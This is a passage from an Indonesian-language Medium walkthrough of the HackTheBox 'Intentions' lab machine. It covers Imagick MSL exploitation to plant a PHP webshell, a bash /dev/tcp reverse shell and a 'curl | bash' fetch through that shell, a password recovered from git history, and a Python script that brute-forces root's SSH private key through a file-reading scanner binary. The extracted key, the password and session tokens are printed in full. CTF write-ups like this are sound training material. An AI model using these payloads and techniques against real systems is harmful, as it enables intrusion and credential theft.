/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bpdlQ7x6fmK70hZCwuH_mg.png\"></figure><p>Saat saya mencoba-coba fitur edit gambar, saya mengalisa sejumlah request yang dibuat ke endpoint /api/v2/admin/image/modify, dimana endpoint tersebut digunakan untuk manipulasi gambar :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/704/1*i7Oh7ZsxlaDcyFvhWymOcA.png\"></figure><p>Dari request diatas kita dapat melihat beberapa data yang dikirimkan :</p>\n<pre>{<br>\"path\":\"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg\",<br>\"effect\":\"charcoal\"<br>}</pre>\n<p>Di sini, kita dapat menentukan path absolut ke file, serta string yang menunjukkan efek yang akan diterapkan. Kita dapat mencoba untuk manipulasi parameter ini, seperti mengarahkan path ke file <strong>/etc/passwd:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*HmklytjNxOxjbxzCRJUOqw.png\"></figure><p>Akan tetapi percobaan diatas gagal dan mendappesan error “bad image path”</p>\n<p>Mari kita tinjau kembali apa yang sudah kita ketahui sejauh ini tentang aplikasi web.</p>\n<ul>\n<li>Kita memiliki endpoint yang kemungkinan memasukkan jalur file ke konstruktor Imagick</li>\n<li>Aplikasi menggunakan PHP</li>\n<li>Kita mengetahui flow lengkap pada sistem yang menghasilkan file yang tersedia untuk publik</li>\n</ul>\n<blockquote>Saya mencoba mencari di web tentang cara mengeksploitasi konstruktor Imagick, saya menemukan artikel <a href=\"https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/\">ini</a> . yang menguraikan cara mengeksploitasi kelas bawaan PHP melalui <strong><em>Arbitrary Object Instatantiations </em></strong>untuk bisa mendapat RCE. Karena eksploitasi bergantung pada Remote File Inclusion (RFI), pertama-tama saya membuat Server web Python dan mengirimkan payload yang jalurnya mengarah ke IP saya.</blockquote>\n<pre>python3 -m http.server 80</pre>\n<p>Kemudian saya mencoba memodifikasi request seperti berikut :</p>\n<pre>{\"path\":\"http://10.10.14.103/test\",\"effect\":\"charcoal\"}</pre>\n<p>Kita mendapat callback di listener server.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/681/1*SI_y6hTKa8RA06hGn9ggWw.png\"></figure><p>Ini mungkin berarti bahwa target dapat dieksploitasi dengan cara yang dijelaskan dalam artikel yang disebutkan di atas. Oleh karena itu, kami mulai menggunakan versi modifikasi dari PoC yang disediakan dalam artikel dan menyimpannya dalam file bernama payload.msl :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/707/1*xCznAqHrtWV2A1Dd5t261A.png\"></figure><p>Sesuai yang dijelaskan dalam artikel, kita menggunakan skema ‘caption:’ dan ‘info:’ untuk mencoba mendapatkan akses web shell. Kita juga mengatur jalur penulisan ke direktori yang dapat diakses publik pada target yang kita temukan sebelumnya.</p>\n<p>Selanjutnya, kita perlu mengirim file ini sebagai formulir multipart. Cara termudah untuk melakukannya adalah dengan membuka Konsol Pengembang di browser kita, buka tab Jaringan, klik salah satu tombol efek gambar, lalu klik kanan permintaan POST ke ‘/modify’ dan salin sebagai perintah cURL.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*_OtVwmgSiGKkeQeRNHdH8A.png\"></figure><p>Maka akan terlihat seperti ini :</p>\n<pre>curl 'http://intentions.htb/api/v2/admin/image/modify' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/json' -H 'X-XSRF-TOKEN: eyJpdiI6IlphSStkVnZRREtmdDN0bzFmRGJhemc9PSIsInZhbHVlIjoidkNuaHVyeVFmSjN0NThuVHdzRy9QYjFURlV0WDF0ZUkvNzY1ZUxJa1FobzZHZ3JQeUhWelhieVpjZG1VdGJPVnR6OERVVFcrcHpnZnJqeDF1a09xYXcxNi8vZzV1Wmd6UzAvaXl5OXdGN1pBb2xxMjJ1czgxRkw0UmFETDhsUHkiLCJtYWMiOiIyNTg1YTA2YTA4YzIxYjI1YzI0MDhjMjA0MTVkMzJkYTViMTU2YjIyYmU2NzZmZjJhODIzNzdiNTY1NjNjMGQ2IiwidGFnIjoiIn0=' -H 'Origin: http://intentions.htb' -H 'Connection: keep-alive' -H 'Referer: http://intentions.htb/admin/' -H 'Cookie: XSRF-TOKEN=eyJpdiI6IlphSStkVnZRREtmdDN0bzFmRGJhemc9PSIsInZhbHVlIjoidkNuaHVyeVFmSjN0NThuVHdzRy9QYjFURlV0WDF0ZUkvNzY1ZUxJa1FobzZHZ3JQeUhWelhieVpjZG1VdGJPVnR6OERVVFcrcHpnZnJqeDF1a09xYXcxNi8vZzV1Wmd6UzAvaXl5OXdGN1pBb2xxMjJ1czgxRkw0UmFETDhsUHkiLCJtYWMiOiIyNTg1YTA2YTA4YzIxYjI1YzI0MDhjMjA0MTVkMzJkYTViMTU2YjIyYmU2NzZmZjJhODIzNzdiNTY1NjNjMGQ2IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ikg1TFlsN3JKSGhKb1RJNmJuQ1EwWXc9PSIsInZhbHVlIjoiS3NXZVBOSjdHYjdJbldPT0xFUGQ2cENPZlVyb0dTYkV2dkhwaUlBSlNVTnlVeWEyb1JtTldDWVdFTlc5Q25tQS9LdFBvc2gydGgrQVRJay9Xb3ZYbStPVVF0c0dYd21qQ1hrb0R2U0ZidStLdzVMSUsrTGUxK3pJVnJuY1ppMEgiLCJtYWMiOiJjNjI3MTkyMzczMmU3ZjkxZDU3OTJhOTU1NThjNTkzNTEzZWY2OTdhZTlhMGI4YmU1N2FkMTZmM2ExNTFlZTUxIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTc0OTM0MjEsImV4cCI6MTY5NzUxNTAyMSwibmJmIjoxNjk3NDkzNDIxLCJqdGkiOiI1UFNSaXJ2TzRSNHNxQ0FlIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.YipzhaZQpAQwlqS8knpIwP-1En_TCD9JzGzBesMhFn0' --data-raw '{\"path\":\"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg\",\"effect\":\"charcoal\"}'</pre>\n<p>Sekarang, kita hapus Content-Type- dan Header lainnya kemudian tambahkan payload. maka akan terlihat seperti ini</p>\n<pre>curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IkYrU3RCMEVacmZhL0doT2ZWUDVkVkE9PSIsInZhbHVlIjoiMVAvSzcxSThKTE9hL3ZsazVvcFovNGMrOXJYMHJhV0xVOWRQcXZ6YWdEdDl4di8xZXltenZBZHUwT2I5QmtoWlJrai9sUDRZelowQzFvZlJTZWppU3NVK1RsVU9WNFFFL0w5QXVhazJUdlN0UDhIZlJFMy9XVkdwRmJQVUVVQlMiLCJtYWMiOiJjODIwY2E1NDRhMDdlNDQzNjRmMGQ5MTQ5YTFmNjk5OWE2Mjg3ZGE2MTY3ZDRkN2UwZWFhNTBiZGIxNmM5OWUzIiwidGFnIjoiIn0=' -H 'Cookie: XSRF-TOKEN=eyJp &lt;SNIP&gt; tFM' -F 'path=vid:msl:/tmp/php*' -F 'effect=asd' -F file=@payload.msl</pre>\n<p>Parameter yang sangat penting disini adalah :</p>\n<pre>-F 'path=vid:msl:/tmp/php*'</pre>\n<p>Penjelasan lengkap terdapat pada artikel di atas, tetapi ini pada dasarnya memungkinkan kita untuk menargetkan file-file sementara PHP yang tersedia dan menyertakan file MSL yang akan kita unggah, tanpa mengetahui nama persisnya.</p>\n<pre>-F 'effect=asd'</pre>\n<p>Endpoint memerlukan parameter efek, tetapi isinya tidak penting.</p>\n<pre>-F file=@payload.msl</pre>\n<p>Terakhir, ini menyebabkan payload.msl lokal kita di-upload.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*P7AhTpow_hQHraS3x_YuOw.png\"></figure><p>Saat menjalankan perintah cURL, kita mungkin melihat kesalahan gateway <strong>502</strong> atau response kosong. Untuk memvalidasi keberhasilan upload, dapat membuka URL berikut:</p>\n<pre>http://intentions.htb/storage/rce.php</pre>\n<p>Disini saya dapat mencoba beberapa command untuk Listing Directory “ls” :</p>\n<pre>http://intentions.htb/storage/rce.php?c=ls</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/976/1*Ro3vLWLA4giCjou3MOEOBQ.png\"></figure><p>Untuk mendapatkan Reverse Shell, kita buat file shell dengan payload berikut :</p>\n<pre>/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.40/9001 0&gt;&amp;1</pre>\n<p>Jalankan python web server :</p>\n<pre>sudo python3 -m http.server 80</pre>\n<p>Kemudian jalankan <strong>netcat</strong> listener :</p>\n<pre>nc -nlvp 9001</pre>\n<p>Terakhir kita jalankan cURL pada webshell seperti berikut :</p>\n<pre>http://intentions.htb/storage/rce.php?c=curl%2010.10.14.103/shell|bash</pre>\n<p>Dan bisa diliat pada listener, kita berhasil mendapatkan reverse shell :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/796/1*qMpxtfSiSr8MXBIpNasRjA.png\"></figure><h3>Proses “Lateral Movement”</h3>\n<p>Pada titik ini kita berhasil masuk sebagai www-data dan sudah dapat menjalankan perintah enumerasi biasa tetapi kita tidak menemukan sesuatu yang menarik. pada folder root dari aplikasi Intentions, kita melihat folder <strong>.git</strong>.</p>\n<pre>www-data@intentions:~/html/intentions$ ls -al <br>ls -al<br>total 820<br>drwxr-xr-x  14 root     root       4096 Feb  2  2023 .<br>drwxr-xr-x   3 root     root       4096 Feb  2  2023 ..<br>-rw-r--r--   1 root     root       1068 Feb  2  2023 .env<br>drwxr-xr-x   8 root     root       4096 Feb  3  2023 .git<br>-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md<br>drwxr-xr-x   7 root     root       4096 Apr 12  2022 app<br>-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan<br>drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap<br>-rw-r--r--   1 root     root       1815 Jan 29  2023 composer.json<br>-rw-r--r--   1 root     root     300400 Jan 29  2023 composer.lock<br>drwxr-xr-x   2 root     root       4096 Jan 29  2023 config<br>drwxr-xr-x   5 root     root       4096 Apr 12  2022 database<br>-rw-r--r--   1 root     root       1629 Jan 29  2023 docker-compose.yml<br>drwxr-xr-x 534 root     root      20480 Jan 30  2023 node_modules<br>-rw-r--r--   1 root     root     420902 Jan 30  2023 package-lock.json<br>-rw-r--r--   1 root     root        891 Jan 30  2023 package.json<br>-rw-r--r--   1 root     root       1139 Jan 29  2023 phpunit.xml<br>drwxr-xr-x   5 www-data www-data   4096 Feb  3  2023 public<br>drwxr-xr-x   7 root     root       4096 Jan 29  2023 resources<br>drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes<br>-rw-r--r--   1 root     root        569 Apr 12  2022 server.php<br>drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage<br>drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests<br>drwxr-xr-x  45 root     root       4096 Jan 29  2023 vendor<br>-rw-r--r--   1 root     root        722 Feb  2  2023 webpack.mix.js</pre>\n<p>Mari kita coba liat pada versi sebelumnya dari project ini menggunakan “git log -p”</p>\n<pre>www-data@intentions:~/html/intentions$ git log -p<br>git log -p<br>fatal: detected dubious ownership in repository at '/var/www/html/intentions'<br>To add an exception for this directory, call:</pre>\n<pre>        git config --global --add safe.directory /var/www/html/intentions</pre>\n<p>Sayangnya, kami diberitahu bahwa kami tidak dapat menjalankan perintah log karena folder <strong>.git</strong> dimiliki oleh root.</p>\n<p>Jika saya mencoba memperbaikinya melalui perintah yang disarankan, maka akan muncul pesan error :</p>\n<pre>www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions<br>&lt;lobal --add safe.directory /var/www/html/intentions<br>error: could not lock config file /var/www/.gitconfig: Permission denied</pre>\n<p>Ditemukan Lack of Write access pada /var/www yang menyebabkan beberapa masalah. ketika membaca dokumentasi Git, ditemukan bahwa Git mencari file konfigurasi di direktori $HOME pengguna. Keterbatasan akses tulis di /var/www dapat diatasi dengan menimpa variabel environment $HOME.</p>\n<pre>HOME=/tmp git config --global --add safe.directory /var/www/html/intentions<br>HOME=/tmp git log -p</pre>\n<p>Sekarang kita bisa melihat logs dan melihat password dari user greg :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1020/1*C2w0foJyTJSGwo8SQt7Zmw.png\"></figure><pre>commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4<br>Author: greg &lt;greg@intentions.htb&gt;<br>Date:   Thu Jan 26 09:21:52 2023 +0100<br>Test cases did not work on steve's local database, switching to user factory per his advice</pre>\n<pre>diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php<br>index f57e37b..0586d51 100644<br>--- a/tests/Feature/Helper.php<br>+++ b/tests/Feature/Helper.php<br>@@ -8,12 +8,14 @@ class Helper extends TestCase<br> {<br>     public static function getToken($test, $admin = false) {<br>         if($admin) {<br>-            $res = $test-&gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);<br>-            return $res-&gt;headers-&gt;get('Authorization');<br>+            $user = User::factory()-&gt;admin()-&gt;create();<br>         } <br>         else {<br>-            $res = $test-&gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg_user@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);<br>-            return $res-&gt;headers-&gt;get('Authorization');<br>+            $user = User::factory()-&gt;create();<br>         }<br>+        <br>+        $token = Auth::login($user);<br>+        $user-&gt;delete();<br>+        return $token;<br>     }<br> }</pre>\n<p>Disini bisa dilihat saya menemukan kata sandi (Gr3g1sTh3B3stDev3l0per!1998!) pada riwayat commit, yang dapat digunakan untuk SSH ke dalam kotak sebagai user greg.</p>\n<pre>ssh greg@intentions.htb</pre>\n<pre>greg@intentions:~$ id<br>uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)</pre>\n<p>Disini bisa dilihat bahwa user greg adalah bagian dari Scanner group, dan user flag bisa ditemukan pada path “/home/greg/flag.txt”.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/764/1*6Ajt-e-xFR7LLy6iSaN0eA.png\"></figure><h3>Privilage Escalation</h3>\n<p>Ketika berhasil autentikasi menggunakan user greg, kita melihat file menarik pada direktory. <strong>dmca_check.sh</strong> dan <strong>dmca_hashes.test</strong></p>\n<pre>total 52<br>drwxr-x--- 4 greg greg  4096 Jun 19 13:09 .<br>drwxr-xr-x 5 root root  4096 Jun 10 14:56 ..<br>lrwxrwxrwx 1 root root     9 Jun 19 13:09 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 greg greg   220 Feb  2  2023 .bash_logout<br>-rw-r--r-- 1 greg greg  3771 Feb  2  2023 .bashrc<br>drwx------ 2 greg greg  4096 Jun 10 15:18 .cache<br>-rwxr-x--- 1 root greg    75 Jun 10 17:33 dmca_check.sh<br>-rwxr----- 1 root greg 11044 Jun 10 15:31 dmca_hashes.test<br>drwxrwxr-x 3 greg greg  4096 Jun 10 15:26 .local<br>-rw-r--r-- 1 greg greg   807 Feb  2  2023 .profile<br>-rw-r----- 1 root greg    33 Oct 17 05:27 user.txt<br>-rw-r--r-- 1 greg greg    39 Jun 14 10:18 .vimrc</pre>\n<p>Pada <strong>dmca_chech.sh</strong> kita bisa melihat bahwa file tersebut meng-eksekusi command berikut :</p>\n<pre>/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test</pre>\n<p>Pada saat menjalankan Command diatas, terlihat output seperti berikut :</p>\n<pre>greg@intentions:~$ /opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test</pre>\n<pre>[+] DMCA-#1952 matches /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg</pre>\n<p>Terlihat bahwa user greg tidak memiliki akses untuk inpect file tersebut.</p>\n<pre>greg@intentions:~$ ls /home/legal/uploads/</pre>\n<pre>ls: cannot access '/home/legal/uploads/': Permission denied</pre>\n<pre>greg@intentions:~$ cat /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg</pre>\n<pre>cat: /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg: Permission denied</pre>\n<p>Ini seharusnya menjadi indikasi pertama kami bahwa sesuatu yang tidak biasa terjadi dalam hal kontrol akses pada biner ini. Letika memeriksa biner itu sendiri, kita dapat melihat bahwa itu bukan biner setuid, dan saya tidak menjalankannya dengan sudo:</p>\n<pre>greg@intentions:~$ ls -al /opt/scanner/scanner</pre>\n<pre>-rwxr-x--- 1 root scanner 1437696 Jun 19 11:18 /opt/scanner/scanner</pre>\n<p>Salah satu cara yang tersisa agar binary bisa mendapat read access ke file dimana kita tidak memiliki kapabilitas. Jika kita check binary dengan menggunakan <strong>getcap</strong>, bisa terlihat bahwa itu memiliki kapabilitas <em>cap_dac_read_search</em> .</p>\n<pre>greg@intentions:~$ getcap /opt/scanner/scanner</pre>\n<pre>/opt/scanner/scanner cap_dac_read_search=ep</pre>\n<p>Ketika me-riset kapabilitas ini , saya menemukan artikel :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/649/1*gBMW-Osn8a5g5q8APwlilw.png\"></figure><p>Dengan kemampuan ini, kita melihat bahwa Scanner Binary tampaknya memiliki kemampuan untuk melakukan read pada file apa pun di sistem, terlepas dari apakah pengguna kita memiliki akses ke file atau keseluruhan jalur file.</p>\n<p>Mari kita cari tahu apakah kita dapat memanfaatkan fungsionalitas Scanner Binary untuk keuntungan kita; menjalankan biner pemindai tanpa argumen memberi kita beberapa informasi berguna:</p>\n<pre>greg@intentions:~$ /opt/scanner/scanner</pre>\n<pre>The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.</pre>\n<pre>        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.<br>        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.<br>        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.</pre>\n<pre>        The hash blacklist file should be maintained as a single LABEL:MD5 per line.<br>        Please avoid using extra colons in the label as that is not currently supported.</pre>\n<pre>        Expected output:<br>        1. Empty if no matches found<br>        2. A line for every match, example:<br>                [+] {LABEL} matches {FILE}</pre>\n<pre>  -c string<br>        Path to image file to check. Cannot be combined with -d<br>  -d string<br>        Path to image directory to check. Cannot be combined with -c<br>  -h string<br>        Path to colon separated hash file. Not compatible with -p<br>  -l int<br>        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)<br>  -p    [Debug] Print calculated file hash. Only compatible with -c<br>  -s string<br>        Specific hash to check against. Not compatible with -h</pre>\n<p>Sebagai galeri gambar, mereka khawatir tentang penerbitan hak cipta, dan telah mengembangkan utilitas untuk memeriksa konten file terhadap blacklist yang diketahui dari file yang memiliki hak cipta. Ada juga referensi bahwa utilitas ini dapat memiliki tujuan ganda untuk mencoba menghindari penambahan gambar duplikat ke galeri saat ukurannya bertambah.</p>\n<p>Untuk mengevaluasi kecocokan, binary menghasilkan hash MD5 untuk konten file dan membandingkannya dengan blacklist yang disediakan pengguna. Dengan membaca file dmca_hashes.test, kita dapat melihat potensi file yang telah di blacklist yang digunakan oleh galeri :</p>\n<pre>$ cat dmca_hashes.test<br>DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c<br>DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc<br>DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd<br>DMCA-#2901:052c4bb8400a5dc6d40bea32dfcb70ed<br>DMCA-#9112:0def227f2cdf0bb3c44809470f28efb6<br>DMCA-#9564:b58b5d64a979327c6068d447365d2593<br>DMCA-#8997:26c3660f8051c384b63ba40ea38bfc72<br>DMCA-#2247:4a705343f961103c567f98b808ee106d<br>DMCA-#6455:1db4f2c6e897d7e2684ffcdf7d907bb3<br>&lt;SNIP&gt;</pre>\n<p>File daftar hitam berisi entri <strong>{LABEL}:{MD5}</strong> pada setiap barisnya. Seperti yang kita lihat pada skrip <strong>dmca_check.sh</strong>, setelah menemukan kecocokan, program akan memberi tahu kita label apa yang memicu kecocokan tersebut, dan file mana yang dianggap cocok. Program ini juga memungkinkan kita untuk memeriksa file tertentu dengan flag -c, atau seluruh direktori dengan flag -d.</p>\n<p>Pada pandangan pertama, ini sepertinya tidak terlalu membantu — kita perlu mengetahui konten file sensitif untuk memeriksa apakah itu cocok. Namun, menggali lebih dalam ke dalam teks bantuan, kita dapat mengamati bahwa pengguna dapat mengontrol berapa banyak byte dari file yang akan diperiksa dengan flag -l. Secara default, program memeriksa 500 byte pertama dari file, tetapi developer memutuskan ini mungkin perlu “panjang variabel” karena banyaknya gambar dan program perlu memeriksa file dengan cepat.</p>\n<p>Karena prosedur hashing MD5 relatif cepat, kita dapat memanfaatkan flag -l dan pada dasarnya melakukan brute force file sensitif byte per byte. Kita dapat membuat skrip Python yang akan menghasilkan “blacklist” dengan semua karakter yang dapat dicetak dan meminta Binary Scanner untuk memeriksa hanya byte pertama dari file sensitif. Ketika pemindai menemukan kecocokan, kita akan mengetahui byte pertama dari file tersebut, dan pada saat itu, kita akan membuat “blacklist” baru dengan karakter pertama dari file tersebut ditambah semua karakter yang dapat dicetak dan meminta pemindai untuk mencocokkan dua byte pertama. Siklus akan terus berlanjut hingga akhir file. Untuk keperluan penulisan ini, skrip akhir terlihat sebagai berikut:</p>\n<p>Maka skripnya akan terlihat seperti berikut :</p>\n<pre>import string<br>import hashlib<br>import subprocess<br>base = \"\"<br>hasResult = True<br>hashMap = {}<br>readFile = \"/root/.ssh/id_rsa\"def checkMatch():<br>        global base<br>        global hashMap<br>        result = subprocess.Popen([\"/opt/scanner/scanner\",\"-c\",readFile,\"-h\",\"./hash.log\",\"-l\",str(len(base) + 1)], stdout=subprocess.PIPE)<br>        for line in result.stdout:<br>        #print(line)<br>        line = str(line)<br>        if \"[+]\" in line:<br>        check = line.split(\" \")<br>        if len(check) == 4:<br>                if check[1] in hashMap:<br>                base = hashMap[check[1]]<br>                return True<br>                return Falsedef writeFile(base):<br>        f = open(\"hash.log\", \"w\")<br>        hashmap = {}<br>        for character in string.printable:<br>                check = base + character<br>                checkHash = hashlib.md5(check.encode())<br>                md5 = checkHash.hexdigest()<br>                hashMap[md5] = check<br>                f.write(md5 + \":\" + md5)<br>                f.write(\"\\n\")<br>        f.close()while hasResult:<br>        writeFile(base)<br>        hasResult = checkMatch()print(\"Found\")<br>print(base)<br>print(\"Done\")</pre>\n<p>Skrip diatas untuk meng-generate hash “blacklist”, eksekusi program scanner dengan beberapa argument dan meng-ekstrak kepada target file. pada case ini kita akan meng-ekstrak root user’s private SSH key :</p>\n<pre>$ python3 extract.py<br>Found<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3<br>HqEMYrWSNpX2HqbvxnhOBCW/uwKMbFb4LPI+EzR6eHr5vG438EoeGmLFBvhge54WkTvQyd<br>vk6xqxjypi3PivKnI2Gm+BWzcMi6kHI+NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZ<br>ZyGpITFR/1KjaCQjLDnshZO7OrM/PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk/OZt<br>0LZdhfMuJsJsFLhZufADwPVRK1B0oMjcnljhUuVvYJtm8Ig/8fC9ZEcycF69E+nBAiDuUm<br>kDAhdj0ilD63EbLof4rQmBuYUQPy/KMUwGujCUBQKw3bXdOMs/jq6n8bK7ERcHIEx6uTdw<br>gE6WlJQhgAp6hT7CiINq34Z2CFd9t2x1o24+JOAQj9JCubRa1fOMFs8OqEBiGQHmOIjmUj<br>7x17Ygwfhs4O8AQDvjhizWop/7Njg7Xm7ouxzoXdAAAFiJKKGvOSihrzAAAAB3NzaC1yc2<br>EAAAGBAOcjLoj2lj6+j9BmIlIuRJ6g/EDjPQe4JtpUx8JQOxTMPef8MvCVtx6hDGK1kjaV<br>9h6m78Z4TgQlv7sCjGxW+CzyPhM0enh6+bxuN/BKHhpixQb4YHueFpE70Mnb5OsasY8qYt<br>z4rypyNhpvgVs3DIupByPjSw1FZ+2jbYQSIPTsiFcKey15d3IFK1jOErb2GWchqSExUf9S<br>o2gkIyw57IWTuzqzPzy1ncoqatsmbTaAee5L82z0aV7uwDWzPMFd3MpPzmbdC2XYXzLibC<br>bBS4WbnwA8D1UStQdKDI3J5Y4VLlb2CbZvCIP/HwvWRHMnBevRPpwQIg7lJpAwIXY9IpQ+<br>txGy6H+K0JgbmFED8vyjFMBrowlAUCsN213TjLP46up/GyuxEXByBMerk3cIBOlpSUIYAK<br>eoU+woiDat+GdghXfbdsdaNuPiTgEI/SQrm0WtXzjBbPDqhAYhkB5jiI5lI+8de2IMH4bO<br>DvAEA744Ys1qKf+zY4O15u6Lsc6F3QAAAAMBAAEAAAGABGD0S8gMhE97LUn3pC7RtUXPky<br>tRSuqx1VWHu9yyvdWS5g8iToOVLQ/RsP+hFga+jqNmRZBRlz6foWHIByTMcOeKH8/qjD4O<br>9wM8ho4U5pzD5q2nM3hR4G1g0Q4o8EyrzygQ27OCkZwi/idQhnz/8EsvtWRj/D8G6ME9lo<br>pHlKdz4fg/tj0UmcGgA4yF3YopSyM5XCv3xac+YFjwHKSgegHyNe3se9BlMJqfz+gfgTz3<br>8l9LrLiVoKS6JsCvEDe6HGSvyyG9eCg1mQ6J9EkaN2q0uKN35T5siVinK9FtvkNGbCEzFC<br>PknyAdy792vSIuJrmdKhvRTEUwvntZGXrKtwnf81SX/ZMDRJYqgCQyf5vnUtjKznvohz2R<br>0i4lakvtXQYC/NNc1QccjTL2NID4nSOhLH2wYzZhKku1vlRmK13HP5BRS0Jus8ScVaYaIS<br>bEDknHVWHFWndkuQSG2EX9a2auy7oTVCSu7bUXFnottatOxo1atrasNOWcaNkRgdehAAAA<br>wQDUQfNZuVgdYWS0iJYoyXUNSJAmzFBGxAv3EpKMliTlb/LJlKSCTTttuN7NLHpNWpn92S<br>pNDghhIYENKoOUUXBgb26gtg1qwzZQGsYy8JLLwgA7g4RF3VD2lGCT377lMD9xv3bhYHPl<br>lo0L7jaj6PiWKD8Aw0StANo4vOv9bS6cjEUyTl8QM05zTiaFk/UoG3LxoIDT6Vi8wY7hIB<br>AhDZ6Tm44Mf+XRnBM7AmZqsYh8nw++rhFdr9d39pYaFgok9DcAAADBAO1D0v0/2a2XO4DT<br>AZdPSERYVIF2W5TH1Atdr37g7i7zrWZxltO5rrAt6DJ79W2laZ9B1Kus1EiXNYkVUZIarx<br>Yc6Mr5lQ1CSpl0a+OwyJK3Rnh5VZmJQvK0sicM9MyFWGfy7cXCKEFZuinhS4DPBCRSpNBa<br>zv25Fap0Whav4yqU7BsG2S/mokLGkQ9MVyFpbnrVcnNrwDLd2/whZoENYsiKQSWIFlx8Gd<br>uCNB7UAUZ7mYFdcDBAJ6uQvPFDdphWPQAAAMEA+WN+VN/TVcfYSYCFiSezNN2xAXCBkkQZ<br>X7kpdtTupr+gYhL6gv/A5mCOSvv1BLgEl0A05BeWiv7FOkNX5BMR94/NWOlS1Z3T0p+mbj<br>D7F0nauYkSG+eLwFAd9K/kcdxTuUlwvmPvQiNg70Z142bt1tKN8b3WbttB3sGq39jder8p<br>nhPKs4TzMzb0gvZGGVZyjqX68coFz3k1nAb5hRS5Q+P6y/XxmdBB4TEHqSQtQ4PoqDj2IP<br>DVJTokldQ0d4ghAAAAD3Jvb3RAaW50ZW50aW9ucwECAw==<br>-----END OPENSSH PRIVATE KEY-----<br>Done</pre>\n<p>Kita beri nama root_key, pastikan untuk memberikan permission yang tepat pada file tersebut dan selanjutnya kita gunakan untuk autentikasi sebagai <strong>root</strong> pada mesin target.</p>\n<pre>chmod 600 root_key<br>ssh -i root root@intentions.htb</pre>\n<pre>root@intentions:~# id<br>uid=0(root) gid=0(root) groups=0(root)</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/473/1*5JkfFiRNP8oiQf5-x4YtiA.png\"></figure><p>Setelah berhasil login sebagai root, ambil root flag pada file root.txt</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/671/1*6j_0QXbI6C921_J6bFiV1Q.png\"></figure><img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=a91356086d2c\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "penetration-testing"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-intentions-hard-a91356086d2c?source=rss-e8b9da247cdf------2"
  },
